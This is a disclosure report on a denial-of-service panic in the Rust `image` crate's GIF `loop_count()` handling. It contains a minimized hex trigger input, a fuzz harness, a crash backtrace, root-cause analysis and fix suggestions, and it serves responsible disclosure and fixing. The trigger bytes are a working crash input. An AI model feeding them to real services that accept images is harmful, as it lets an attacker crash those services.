# Vulnerability Report: Panic in GIF `loop_count()` on zero repeat count leads to DoS

## Summary

`image` crate’s GIF decoder can be crashed (panic) by crafted input when parsing the animation repeat count. Specifically, calling `GifDecoder::loop_count()` on certain malformed GIF-like inputs can cause an `expect()` failure with the message **“Repeat::Finite should be non-zero”**, terminating the process. This is a denial-of-service (DoS) issue for applications that parse untrusted GIF data and query loop count metadata.

## Affected Component

- Repository: `github.com/image-rs/image`
- Component: `image::codecs::gif` (`GifDecoder::loop_count()`)
- Crash site: `image/src/codecs/gif.rs:430:43` (as shown in backtrace)

> Note: Exact affected versions are not confirmed in the provided log. The issue is reproducible on the reporter’s build with Rust 1.91.0. Please map the line to the corresponding `image` crate version/commit used in the fuzz environment.

## Vulnerability Type

- Denial of Service (DoS) via panic
- Root cause category: insufficient input validation / unsafe assumption on untrusted data (`expect()` on reachable path)

## Impact

Applications that:

1. accept untrusted GIF data, and
2. call `GifDecoder::loop_count()` (directly or indirectly),

may be remotely crashed by an attacker providing a crafted file / payload. The panic aborts the process (common in fuzzing builds and in some production configurations), causing a DoS.

## POC

### Trigger Input (minimized example)

Hex dump (example trigger input):

```
00000000: 4e47 4946 3837 6146 4e50 890d 0a1a 0a0a  NGIF87aFNP......
```

### Fuzz Target

```rust
#![no_main]
#[macro_use]
extern crate libfuzzer_sys;
extern crate image;

use std::io::Cursor;

use image::codecs::gif::GifDecoder;
use image::codecs::png::PngDecoder;
use image::codecs::webp::WebPDecoder;
use image::{AnimationDecoder, ImageDecoder, Limits};

const MAX_FRAME_BYTES: u64 = 32 * 1024 * 1024;
const MAX_WEBP_PIXELS: u64 = 16 * 1024 * 1024;
const MAX_FRAMES: usize = 8;

fn fuzz_gif(data: &[u8]) {
    let mut decoder = match GifDecoder::new(Cursor::new(data)) {
        Ok(decoder) => decoder,
        Err(_) => return,
    };

    let mut limits = Limits::default();
    limits.max_alloc = Some(MAX_FRAME_BYTES);
    if decoder.set_limits(limits).is_err() {
        return;
    }

    // Triggers panic for crafted inputs
    let _ = decoder.loop_count();

    for frame in decoder.into_frames().take(MAX_FRAMES) {
        let _ = frame;
    }
}

fn fuzz_webp(data: &[u8]) {
    let decoder = match WebPDecoder::new(Cursor::new(data)) {
        Ok(decoder) => decoder,
        Err(_) => return,
    };

    if !decoder.has_animation() {
        return;
    }

    let (width, height) = decoder.dimensions();
    if u64::from(width) * u64::from(height) > MAX_WEBP_PIXELS {
        return;
    }

    let _ = decoder.loop_count();
    for frame in decoder.into_frames().take(MAX_FRAMES) {
        let _ = frame;
    }
}

fn fuzz_apng(data: &[u8]) {
    let mut limits = Limits::default();
    limits.max_alloc = Some(MAX_FRAME_BYTES);

    let decoder = match PngDecoder::with_limits(Cursor::new(data), limits) {
        Ok(decoder) => decoder,
        Err(_) => return,
    };

    match decoder.is_apng() {
        Ok(true) => {}
        Ok(false) | Err(_) => return,
    }

    let decoder = match decoder.apng() {
        Ok(decoder) => decoder,
        Err(_) => return,
    };

    let _ = decoder.loop_count();
    for frame in decoder.into_frames().take(MAX_FRAMES) {
        let _ = frame;
    }
}

fuzz_target!(|data: &[u8]| {
    if data.len() < 2 {
        return;
    }

    match data[0] % 3 {
        0 => fuzz_gif(&data[1..]),
        1 => fuzz_webp(&data[1..]),
        _ => fuzz_apng(&data[1..]),
    }
});
```

### Reproduction Command

```bash
CXX=/usr/bin/g++ CC=/usr/bin/gcc cargo fuzz run fuzzer_script_animation
```

### Observed Crash Output

```
thread '<unnamed>' (11499) panicked at /mnt/h/Security/Binary/Project/image/src/codecs/gif.rs:430:43:
Repeat::Finite should be non-zero
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
==11499== ERROR: libFuzzer: deadly signal
    #0 0x58f306d3a261 in __sanitizer_print_stack_trace /rustc/llvm/src/llvm-project/compiler-rt/lib/asan/asan_stack.cpp:87:3
    #1 0x58f306f473fa in fuzzer::PrintStackTrace() /root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libfuzzer-sys-0.4.12/libfuzzer/FuzzerUtil.cpp:210:5
    #2 0x58f306f17a73 in fuzzer::Fuzzer::CrashCallback() /root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libfuzzer-sys-0.4.12/libfuzzer/FuzzerLoop.cpp:231:3
    #3 0x7110e0b2cdef  (/lib/x86_64-linux-gnu/libc.so.6+0x3fdef) (BuildId: def5460e3cee00bfee25b429c97bcc4853e5b3a8)
    #4 0x7110e0b8195b in __pthread_kill_implementation nptl/pthread_kill.c:43:17
    #5 0x7110e0b2ccc1 in raise signal/../sysdeps/posix/raise.c:26:13
    #6 0x7110e0b154ab in abort stdlib/abort.c:73:3
    #7 0x58f306f6c229 in std::sys::pal::unix::abort_internal::hf5e36381f64f0a78 /rustc/6ba0ce40941eee1ca02e9ba49c791ada5158747a/library/std/src/sys/pal/unix/mod.rs:366:14
    #8 0x58f306f6c218 in std::process::abort::h49f9c39b5600dd95 /rustc/6ba0ce40941eee1ca02e9ba49c791ada5158747a/library/std/src/process.rs:2499:5
    #9 0x58f306f14a84 in libfuzzer_sys::initialize::_$u7b$$u7b$closure$u7d$$u7d$::h011da2e033d5ec05 /root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libfuzzer-sys-0.4.12/src/lib.rs:94:9
    #10 0x58f306f5d180 in _$LT$alloc..boxed..Box$LT$F$C$A$GT$$u20$as$u20$core..ops..function..Fn$LT$Args$GT$$GT$::call::hb662795a5a5f9b91 /rustc/6ba0ce40941eee1ca02e9ba49c791ada5158747a/library/alloc/src/boxed.rs:1999:9
    #11 0x58f306f5d180 in std::panicking::panic_with_hook::hf343f38c566b7de3 /rustc/6ba0ce40941eee1ca02e9ba49c791ada5158747a/library/std/src/panicking.rs:842:13
    #12 0x58f306f6c959 in std::panicking::panic_handler::_$u7b$$u7b$closure$u7d$$u7d$::h5999c7a88a85d27c /rustc/6ba0ce40941eee1ca02e9ba49c791ada5158747a/library/std/src/panicking.rs:707:13
    #13 0x58f306f6c8b8 in std::sys::backtrace::__rust_end_short_backtrace::h66ef81f3bd341240 /rustc/6ba0ce40941eee1ca02e9ba49c791ada5158747a/library/std/src/sys/backtrace.rs:174:18
    #14 0x58f306f5cb8c in __rustc::rust_begin_unwind /rustc/6ba0ce40941eee1ca02e9ba49c791ada5158747a/library/std/src/panicking.rs:698:5
    #15 0x58f306f8bd2f in core::panicking::panic_fmt::h5434febb0b631f9c /rustc/6ba0ce40941eee1ca02e9ba49c791ada5158747a/library/core/src/panicking.rs:75:14
    #16 0x58f306f8c61a in core::panicking::panic_display::hd9477ee3e3670115 /rustc/6ba0ce40941eee1ca02e9ba49c791ada5158747a/library/core/src/panicking.rs:259:5
    #17 0x58f306f8c61a in core::option::expect_failed::hf93710017d34c715 /rustc/6ba0ce40941eee1ca02e9ba49c791ada5158747a/library/core/src/option.rs:2139:5
    #18 0x58f306dcee14 in expect<core::num::nonzero::NonZero<u32>> /root/.rustup/toolchains/nightly-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/option.rs:964:21
    #19 0x58f306dcee14 in loop_count<std::io::cursor::Cursor<&[u8]>> /mnt/h/Security/Binary/Project/image/src/codecs/gif.rs:430:43
    #20 0x58f306dcee14 in fuzz_gif /mnt/h/Security/Binary/Project/image/fuzz/fuzzers/fuzzer_script_animation.rs:29:21
    #21 0x58f306dcee14 in fuzzer_script_animation::_::__libfuzzer_sys_run::h40909a138bfec27c /mnt/h/Security/Binary/Project/image/fuzz/fuzzers/fuzzer_script_animation.rs:87:14
    #22 0x58f306dc8b88 in rust_fuzzer_test_input /root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libfuzzer-sys-0.4.12/src/lib.rs:276:60
    #23 0x58f306f14f15 in {closure#0} /root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libfuzzer-sys-0.4.12/src/lib.rs:62:9
    #24 0x58f306f14f15 in std::panicking::catch_unwind::do_call::h1d1434b3113fdc85 /root/.rustup/toolchains/nightly-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/std/src/panicking.rs:590:40
    #25 0x58f306f16088 in __rust_try libfuzzer_sys.a11ee64f1d731ead-cgu.0
    #26 0x58f306f14bed in catch_unwind<i32, libfuzzer_sys::test_input_wrap::{closure_env#0}> /root/.rustup/toolchains/nightly-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/std/src/panicking.rs:553:19
    #27 0x58f306f14bed in catch_unwind<libfuzzer_sys::test_input_wrap::{closure_env#0}, i32> /root/.rustup/toolchains/nightly-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/std/src/panic.rs:359:14
    #28 0x58f306f14bed in LLVMFuzzerTestOneInput /root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libfuzzer-sys-0.4.12/src/lib.rs:60:22
    #29 0x58f306f19688 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libfuzzer-sys-0.4.12/libfuzzer/FuzzerLoop.cpp:619:13
    #30 0x58f306f26149 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) /root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libfuzzer-sys-0.4.12/libfuzzer/FuzzerDriver.cpp:335:6
    #31 0x58f306f2c899 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libfuzzer-sys-0.4.12/libfuzzer/FuzzerDriver.cpp:871:9
    #32 0x58f306f465a2 in main /root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libfuzzer-sys-0.4.12/libfuzzer/FuzzerMain.cpp:20:10
    #33 0x7110e0b16ca7 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #34 0x7110e0b16d64 in __libc_start_main csu/../csu/libc-start.c:360:3
    #35 0x58f306ca4980 in _start (/mnt/h/Security/Binary/Project/image/fuzz/target/x86_64-unknown-linux-gnu/release/fuzzer_script_animation+0x1ab980) (BuildId: 4730c6147a891dd185f04ebc98954a922f5c3b9b)
```

## Root Cause Analysis

`GifDecoder::loop_count()` parses the GIF animation repeat/loop count and (at least in the crashing code path) converts it into a non-zero type (`NonZeroU32`) for `Repeat::Finite`. For crafted input where the repeat count is **0**, `NonZeroU32::new(0)` returns `None`, but the code uses `expect()` (or equivalent) to assert this case is impossible:

- repeat count is 0
- `NonZeroU32::new(0)` → `None`
- `expect("Repeat::Finite should be non-zero")` → panic → process abort/DoS

This is a defensive-programming issue: the decoder operates on untrusted input and must not assume such values are unreachable.

## Security Impact / Exploitability

- **Attack scenario:** A service that uses `image` to inspect GIF metadata (e.g., to decide animation behavior, preflight checks, or decoding policy) can be crashed by an attacker uploading/supplying a crafted GIF payload.
- **Result:** Process termination → Denial of Service.
- **Preconditions:** The victim application triggers the `loop_count()` path (direct call or via higher-level APIs).

## Expected Behavior

The decoder should not panic on malformed input. Possible correct behaviors include:

- Return `Ok(None)` or another “unknown/invalid” representation for loop count;
- Treat 0 as `Repeat::Infinite` (if aligned with the chosen GIF semantics);
- Return a decoding error (`Err`) instead of panicking.

In all cases, malformed loop count data must be handled gracefully.

## Suggested Fix

### Code change

Replace `expect()/unwrap()` on the loop count conversion with safe handling:

- If loop count == 0:
  - Option A (compat): interpret as `Repeat::Infinite` (common convention), OR
  - Option B (strict): return an error (`ImageError::Decoding`) or `Ok(None)`

Ensure `GifDecoder::loop_count()` never panics on untrusted input.

### Regression tests

Add unit/regression tests for:

1. A GIF containing a loop extension with repeat count = 0
2. Malformed/short extension blocks that could lead to the same parsing edge cases

Assertions:

- No panic
- Return value matches the chosen semantics (Infinite / None / Err)

### Fuzzing

Add the minimized crash input to the GIF corpus and keep the `loop_count()` call in fuzz targets to prevent reintroduction.

## Environment

- Module: `github.com/image-rs/image`
- Platform: Ubuntu 22.04
- Rustc version: 1.91.0
- Fuzzing: `cargo-fuzz`
